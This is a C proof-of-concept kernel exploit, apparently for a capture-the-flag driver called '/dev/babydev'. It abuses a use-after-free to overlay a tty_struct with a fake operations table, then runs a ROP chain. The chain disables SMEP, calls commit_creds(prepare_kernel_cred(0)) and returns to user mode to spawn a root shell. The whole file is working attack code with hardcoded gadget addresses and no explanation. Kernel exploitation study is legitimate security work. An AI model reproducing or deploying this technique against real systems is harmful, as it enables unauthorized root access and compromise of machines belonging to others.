//poc.c
//gcc poc.c -o poc -w -static
#include<stdio.h>
#include<unistd.h>
#include<fcntl.h>
unsigned long user_cs, user_ss, user_eflags,user_sp;
size_t commit_creds_addr = 0xffffffff810a1420;
size_t prepare_kernel_cred_addr = 0xffffffff810a1810;
void* fake_tty_opera[30];
 
void shell(){
    system("/bin/sh");
}
 
void save_stats(){
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %3\n"
        "pushfq\n"
        "popq %2\n"
        :"=r"(user_cs), "=r"(user_ss), "=r"(user_eflags),"=r"(user_sp)
        :
        : "memory"
    );
}
 
void get_root(){
    char* (*pkc)(int) = prepare_kernel_cred_addr;
    void (*cc)(char*) = commit_creds_addr;
    (*cc)((*pkc)(0));
}
 
int main(){
    int fd1,fd2,fd3,i=0;
    size_t fake_tty_struct[4] = {0};
    size_t rop[20]={0};
    save_stats();
 
    rop[i++] = 0xffffffff810d238d;      //pop_rdi_ret
    rop[i++] = 0x6f0;
    rop[i++] = 0xffffffff81004d80;      //mov_cr4_rdi_pop_rbp_ret
    rop[i++] = 0x6161616161;
    rop[i++] = (size_t)get_root;
    rop[i++] = 0xffffffff81063694;      //swapgs_pop_rbp_ret
    rop[i++] = 0x6161616161;
    rop[i++] = 0xffffffff814e35ef;      // iretq; ret;
    rop[i++] = (size_t)shell;
    rop[i++] = user_cs;
    rop[i++] = user_eflags;
    rop[i++] = user_sp;
    rop[i++] = user_ss;
 
    for(i = 0; i < 30; i++)
    {
        fake_tty_opera[i] = 0xffffffff8181bfc5;
    }
    fake_tty_opera[0] = 0xffffffff810635f5;     //pop rax; pop rbp; ret;
    fake_tty_opera[1] = (size_t)rop;
    fake_tty_opera[3] = 0xffffffff8181bfC5;     // mov rsp,rax ; dec ebx ; ret
    fake_tty_opera[7] = 0xffffffff8181bfc5; 
 
    fd1 = open("/dev/babydev",O_RDWR);
    fd2 = open("/dev/babydev",O_RDWR);
    ioctl(fd1,0x10001,0x2e0);
    close(fd1);
    fd3 = open("/dev/ptmx",O_RDWR|O_NOCTTY);
    read(fd2, fake_tty_struct, 32);
    fake_tty_struct[3] = (size_t)fake_tty_opera;
    write(fd2,fake_tty_struct, 32);
    write(fd3,"cc-sir",6);                      //触发rop
    return 0;
}
